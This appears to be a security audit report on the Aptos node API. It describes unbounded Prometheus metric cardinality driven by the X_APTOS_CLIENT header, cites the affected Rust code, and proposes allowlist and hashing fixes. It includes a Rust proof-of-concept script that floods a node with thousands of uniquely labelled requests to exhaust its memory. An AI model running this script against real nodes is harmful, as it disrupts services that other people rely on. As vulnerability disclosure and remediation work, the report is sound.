# Audit Report

## Title
Unbounded Prometheus Metrics Cardinality Attack via X_APTOS_CLIENT Header Leading to Memory Exhaustion

## Summary
The API logging middleware in `api/src/log.rs` increments the `REQUEST_SOURCE_CLIENT` Prometheus counter using unsanitized values from the `X_APTOS_CLIENT` HTTP header. An attacker can send requests with many distinct client strings matching the validation regex, causing unbounded metric cardinality growth and eventual node memory exhaustion (OOM).

## Finding Description

The vulnerability exists in the API request logging middleware where client identification strings are used directly as Prometheus metric labels without cardinality limits.

**Attack Flow:**

1. The `middleware_log()` function processes every API request [1](#0-0) 

2. It extracts the client identifier from the `X_APTOS_CLIENT` HTTP header [2](#0-1) 

3. The `determine_request_source_client()` function validates this header against a permissive regex pattern `r"aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+"` [3](#0-2) 

4. The extracted value is used directly as a metric label in `REQUEST_SOURCE_CLIENT` counter [4](#0-3) 

5. The `REQUEST_SOURCE_CLIENT` metric is defined as an `IntCounterVec` with three label dimensions: `request_source_client`, `operation_id`, and `status` [5](#0-4) 

6. Prometheus creates a new time series for each unique combination of label values, storing them in memory indefinitely

**Why This Breaks Invariants:**

This violates **Invariant #9: Resource Limits** - "All operations must respect gas, storage, and computational limits." The metric collection has no memory bounds and can grow without limit based on attacker-controlled input.

**Known Pattern in Codebase:**

The codebase explicitly documents this exact attack vector in the peer fuzzing module, warning that unbounded metrics cause OOM during fuzzing and production [6](#0-5) 

## Impact Explanation

**Severity: High** (qualifies for up to $50,000 per Aptos Bug Bounty)

This vulnerability meets multiple High severity criteria:

1. **Validator node slowdowns**: As metric cardinality grows, Prometheus scraping becomes increasingly expensive, degrading API response times and overall node performance

2. **API crashes**: Eventually, the node will exhaust available memory and crash with OOM, causing complete API unavailability

3. **Network-wide impact**: If attackers target multiple fullnodes and validator nodes simultaneously, this could cause widespread service disruption affecting network observability and potentially validator operations

The attack does not require authentication, significant resources, or insider access - any client can send HTTP requests with custom headers. While monitoring exists to warn about high cardinality (>2000 dimensions) [7](#0-6) , this is reactive monitoring, not preventive protection.

## Likelihood Explanation

**Likelihood: High**

This attack is highly likely to occur because:

1. **Low barrier to entry**: Any unauthenticated client can send API requests with custom `X_APTOS_CLIENT` headers
2. **No rate limiting on cardinality**: While general request rate limiting may exist [8](#0-7) , there's no specific protection against metric cardinality attacks
3. **Permissive regex**: The validation pattern allows countless valid combinations (e.g., "aptos-attacker-1/1.0.0", "aptos-attacker-2/1.0.0", etc.)
4. **Public exposure**: API endpoints are typically exposed to the internet on production nodes
5. **No cleanup mechanism**: Prometheus metrics persist in memory until the process restarts

## Recommendation

Implement cardinality protection using the same pattern demonstrated in the pepper service [9](#0-8) :

**Solution 1: Allowlist Known Clients**

```rust
// In api/src/log.rs, add a constant for known clients
const KNOWN_CLIENTS: &[&str] = &[
    "aptos-cli",
    "aptos-sdk-python",
    "aptos-sdk-typescript", 
    "aptos-sdk-rust",
    // Add other official SDKs
];

const UNKNOWN_CLIENT: &str = "unknown";

fn determine_request_source_client(aptos_client: &Option<String>) -> &str {
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN,
    };

    match REQUEST_SOURCE_CLIENT_REGEX.find_iter(aptos_client).last() {
        Some(capture) => {
            let client_str = capture.as_str();
            // Extract just the client name (before the /)
            let client_name = client_str.split('/').next().unwrap_or("");
            
            // Check if this is a known client
            if KNOWN_CLIENTS.iter().any(|&known| client_name.starts_with(known)) {
                client_name
            } else {
                UNKNOWN_CLIENT
            }
        },
        None => REQUEST_SOURCE_CLIENT_UNKNOWN,
    }
}
```

**Solution 2: Hash Unknown Values**

```rust
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};

fn determine_request_source_client(aptos_client: &Option<String>) -> String {
    let aptos_client = match aptos_client {
        Some(aptos_client) => aptos_client,
        None => return REQUEST_SOURCE_CLIENT_UNKNOWN.to_string(),
    };

    match REQUEST_SOURCE_CLIENT_REGEX.find_iter(aptos_client).last() {
        Some(capture) => {
            let client_str = capture.as_str();
            let client_name = client_str.split('/').next().unwrap_or("");
            
            // For unknown clients, use a bucketed hash to limit cardinality
            if !KNOWN_CLIENTS.iter().any(|&known| client_name.starts_with(known)) {
                let mut hasher = DefaultHasher::new();
                client_str.hash(&mut hasher);
                let hash_value = hasher.finish();
                // Limit to 100 buckets for unknown clients
                return format!("unknown-bucket-{}", hash_value % 100);
            }
            client_name.to_string()
        },
        None => REQUEST_SOURCE_CLIENT_UNKNOWN.to_string(),
    }
}
```

## Proof of Concept

```rust
// PoC demonstrating the cardinality attack
// This can be run as a separate Rust binary or integration test

use reqwest::Client;
use std::time::Duration;
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    let target_url = "http://localhost:8080/v1"; // API endpoint
    
    println!("[*] Starting cardinality attack on API metrics...");
    
    // Send 10,000 requests with unique X_APTOS_CLIENT headers
    for i in 0..10000 {
        let client_header = format!("aptos-attacker-{}/1.0.0", i);
        
        let response = client
            .get(target_url)
            .header("X-Aptos-Client", &client_header)
            .timeout(Duration::from_secs(5))
            .send()
            .await;
            
        if i % 100 == 0 {
            println!("[*] Sent {} requests with unique client headers", i);
        }
        
        // Small delay to avoid overwhelming the API immediately
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    
    println!("[*] Attack complete. Check node memory usage and /metrics endpoint.");
    println!("[*] The REQUEST_SOURCE_CLIENT metric should now have 10,000+ time series.");
    
    Ok(())
}
```

**Verification Steps:**

1. Start an Aptos node with API enabled
2. Check baseline memory: `curl http://localhost:9101/metrics | grep aptos_api_request_source_client | wc -l`
3. Run the PoC script above
4. Monitor memory growth: `watch -n 1 'ps aux | grep aptos-node'`
5. Verify metric explosion: `curl http://localhost:9101/metrics | grep aptos_api_request_source_client | wc -l`
6. Expected result: Thousands of new metric time series created, memory usage increasing linearly

**Notes**

The codebase already demonstrates awareness of this vulnerability class through explicit documentation of the identical attack pattern in the network peer handling code. The mitigation pattern (replacing unbounded values with fixed labels) is also demonstrated in the pepper service metrics. However, the API logging middleware lacks these protections, making it vulnerable to this well-understood attack vector.

### Citations

**File:** api/src/log.rs (L21-22)
```rust
static REQUEST_SOURCE_CLIENT_REGEX: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"aptos-[a-zA-Z\-]+/[0-9A-Za-z\.\-]+").unwrap());
```

**File:** api/src/log.rs (L54-141)
```rust
pub async fn middleware_log<E: Endpoint>(next: E, request: Request) -> Result<Response> {
    let start = std::time::Instant::now();

    let (trace_id, span_id) = extract_trace_context(&request);

    let mut log = HttpRequestLog {
        remote_addr: request.remote_addr().as_socket_addr().cloned(),
        method: request.method().clone(),
        path: request.uri().path().to_string(),
        status: 0,
        referer: request
            .headers()
            .get(header::REFERER)
            .and_then(|v| v.to_str().ok().map(|v| v.to_string())),
        user_agent: request
            .headers()
            .get(header::USER_AGENT)
            .and_then(|v| v.to_str().ok().map(|v| v.to_string())),
        aptos_client: request
            .headers()
            .get(X_APTOS_CLIENT)
            .and_then(|v| v.to_str().ok().map(|v| v.to_string())),
        elapsed: Duration::from_secs(0),
        forwarded: request
            .headers()
            .get(header::FORWARDED)
            .and_then(|v| v.to_str().ok().map(|v| v.to_string())),
        content_length: request
            .headers()
            .get(header::CONTENT_LENGTH)
            .and_then(|v| v.to_str().ok().map(|v| v.to_string())),
        trace_id,
        span_id,
    };

    let response = next.get_response(request).await;

    let elapsed = start.elapsed();

    log.status = response.status().as_u16();
    log.elapsed = elapsed;

    if log.status >= 500 {
        sample!(SampleRate::Duration(Duration::from_secs(1)), warn!(log));
    } else if log.status >= 400 {
        sample!(SampleRate::Duration(Duration::from_secs(60)), info!(log));
    } else {
        sample!(SampleRate::Duration(Duration::from_secs(1)), debug!(log));
    }

    // Log response statuses generally.
    RESPONSE_STATUS
        .with_label_values(&[log.status.to_string().as_str()])
        .observe(elapsed.as_secs_f64());

    let operation_id = response
        .data::<OperationId>()
        .map(|operation_id| operation_id.0)
        .unwrap_or("operation_id_not_set");

    // Log response status per-endpoint + method.
    HISTOGRAM
        .with_label_values(&[
            log.method.as_str(),
            operation_id,
            log.status.to_string().as_str(),
        ])
        .observe(elapsed.as_secs_f64());

    // Push a counter based on the request source, sliced up by endpoint + method.
    REQUEST_SOURCE_CLIENT
        .with_label_values(&[
            determine_request_source_client(&log.aptos_client),
            operation_id,
            log.status.to_string().as_str(),
        ])
        .inc();

    if log.method == Method::POST {
        if let Some(length) = log.content_length.and_then(|l| l.parse::<u32>().ok()) {
            POST_BODY_BYTES
                .with_label_values(&[operation_id, log.status.to_string().as_str()])
                .observe(length as f64);
        }
    }

    Ok(response)
}
```

**File:** api/src/metrics.rs (L61-68)
```rust
pub static REQUEST_SOURCE_CLIENT: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "aptos_api_request_source_client",
        "API requests grouped by source (e.g. which SDK, unknown, etc), operation_id, and status",
        &["request_source_client", "operation_id", "status"]
    )
    .unwrap()
});
```

**File:** network/framework/src/peer/fuzzing.rs (L68-73)
```rust
    // We want to choose a constant peer id for _our_ peer id, since we will
    // generate unbounded metrics otherwise and OOM during fuzzing.
    let peer_id = PeerId::ZERO;
    // However, we want to choose a random _remote_ peer id to ensure we _don't_
    // have metrics logging the remote peer id (which would eventually OOM in
    // production for public-facing nodes).
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L56-68)
```rust
    for metric_family in &metric_families {
        let family_count = metric_family.get_metric().len();
        if family_count > 2000 {
            families_over_2000 = families_over_2000.saturating_add(1);
            let name = metric_family.get_name();
            warn!(
                count = family_count,
                metric_family = name,
                "Metric Family '{}' over 2000 dimensions '{}'",
                name,
                family_count
            );
        }
```

**File:** api/src/runtime.rs (L229-259)
```rust
    runtime_handle.spawn(async move {
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);

        // Build routes for the API
        let route = Route::new()
            .at("/", poem::get(root_handler))
            .nest(
                "/v1",
                Route::new()
                    .nest("/", api_service)
                    .at("/spec.json", poem::get(spec_json))
                    .at("/spec.yaml", poem::get(spec_yaml))
                    // TODO: We add this manually outside of the OpenAPI spec for now.
                    // https://github.com/poem-web/poem/issues/364
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
            )
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** keyless/pepper/service/src/metrics.rs (L155-161)
```rust
    // Determine the request endpoint to use in the metrics (i.e., replace
    // invalid paths with a fixed label to avoid high cardinality).
    let request_endpoint = if is_known_path(request_endpoint) {
        request_endpoint
    } else {
        INVALID_PATH
    };
```
